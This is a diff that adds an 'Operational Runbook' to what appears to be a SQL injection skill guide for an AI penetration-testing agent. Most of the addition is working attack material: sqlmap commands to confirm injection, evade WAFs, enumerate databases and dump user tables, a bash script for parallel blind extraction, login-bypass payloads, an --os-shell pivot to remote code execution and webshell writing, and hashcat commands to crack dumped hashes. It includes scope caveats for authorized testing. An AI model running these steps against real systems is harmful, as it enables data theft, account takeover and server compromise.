@@ -150,6 +150,119 @@ SQLi remains one of the most durable and impactful vulnerability classes. Modern
 6. **Pivot to metadata** - version, current user, database name
 7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible
 
+## Operational Runbook
+
+Once SQLi is detected, this is the canonical sequence to extract evidence. **Do NOT iterate payloads manually in a browser** — orchestrate via shell so the agent loop logs every command.
+
+### Step 1 — confirm + fingerprint with sqlmap (one call)
+
+```bash
+# GET — single param injectable, default risk/level
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch --output-dir=sqlmap_<TARGET>/
+
+# POST — full body, --data is critical
+sqlmap -u '<TARGET_URL>' --data '<BENIGN_POST_BODY>' -p <PARAM> --batch \
+  --output-dir=sqlmap_<TARGET>/
+
+# With session cookie / bearer
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
+  --cookie '<COOKIE_HEADER>' -H 'Authorization: Bearer <TOKEN>' \
+  --output-dir=sqlmap_<TARGET>/
+
+# When standard probing returns 0 — bump risk/level + try WAF tamper scripts
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
+  --risk 3 --level 5 \
+  --tamper=space2comment,between,randomcase,charunicodeencode \
+  --output-dir=sqlmap_<TARGET>/
+```
+
+Triage output: `sqlmap_<TARGET>/log` contains the confirmed payload + DBMS. That's evidence #1.
+
+### Step 2 — enumerate (DB → tables → schema)
+
+```bash
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch --dbs --output-dir=sqlmap_<TARGET>/
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch -D <DB> --tables --output-dir=sqlmap_<TARGET>/
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch -D <DB> -T <TABLE> --columns --output-dir=sqlmap_<TARGET>/
+```
+
+### Step 3 — extract sensitive rows
+
+```bash
+# Dump targeted table
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
+  -D <DB> -T users --dump --threads 4 --output-dir=sqlmap_<TARGET>/
+
+# Boolean-blind specifically — speed up with parallel threads
+sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
+  --technique=B --threads 8 -D <DB> -T users --dump
+```
+
+**HARD RULE**: once `--dbs` returns, the next call MUST be `--tables` on the target DB. Don't keep re-confirming injection — that's noise.
+
+### Step 4 — blind extraction by hand (when sqlmap is blocked)
+
+When the target's WAF filters `UNION`, `SELECT`, etc. but boolean-blind still works:
+
+```bash
+# Confirm one-bit extraction
+for i in 1 2 3 4 5; do
+  curl -s "<TARGET>?<PARAM>=1' AND ASCII(SUBSTRING(version(),$i,1))>96-- -" \
+    -w '%{size_download}\n' -o /dev/null
+done
+
+# Parallel char-by-char (bash + GNU parallel) — extract version[1..30]
+extract_char() {
+  local pos=$1
+  for c in {32..126}; do
+    response=$(curl -s "<TARGET>?<PARAM>=1' AND ASCII(SUBSTRING(version(),$pos,1))=$c-- -" -w '%{size_download}' -o /dev/null)
+    [[ $response -eq $TRUE_LENGTH ]] && printf "\\$(printf '%03o' $c)" && return
+  done
+}
+export -f extract_char
+parallel -j 8 extract_char ::: {1..30}
+```
+
+### Step 5 — auth-bypass payload library (post-detection login flow)
+
+When SQLi is on a `/login` endpoint, the boolean-blind detection isn't always enough — try these in order until one returns a session token / 2xx + JSON-success-shape:
+
+```
+' OR 1=1--                  # most common
+admin' OR 1=1--             # bypass + username spec
+' OR '1'='1' --
+' OR 1=1#                   # MySQL comment
+admin'#
+') OR 1=1--                 # closes paren
+admin') OR 1=1--
+```
+
+If any payload returns a `set-cookie: session=` header or `{"token":"..."}` body, that's **critical-severity auth-bypass evidence**. Document the baseline response (random invalid creds → 401) alongside the bypass response (payload → 2xx + token) for the report.
+
+### Step 6 — pivot to RCE (DBMS + privilege gated)
+
+| DBMS | Path | Command |
+|---|---|---|
+| MSSQL | `xp_cmdshell` (often disabled) | `sqlmap ... --os-shell` |
+| MySQL | `INTO OUTFILE` + LFI | `sqlmap ... --os-shell` (writes webshell) |
+| PostgreSQL | `COPY ... PROGRAM` (≥9.3) | `sqlmap ... --os-shell` |
+| Oracle | `DBMS_SCHEDULER` jobs | manual; rarely needed in AppSec scope |
+
+If sqlmap reports RCE feasibility but the engagement scope excludes it, STOP and document the capability — do not actually pop the shell unless `opsec_level: loud` AND scope explicitly authorizes RCE.
+
+### Hash cracking (post-extraction)
+
+```bash
+# Identify hash type with hashid first
+hashid <extracted_hash>
+
+# Crack with hashcat (replace mode-id per hashid output)
+hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+```
+
+Document cracked plaintexts as **evidence of impact** (e.g. "admin password recovered: `***`") without echoing the actual password into the finding — replace with `***` or last-2-chars + length.
+
 ## Validation
 
 1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
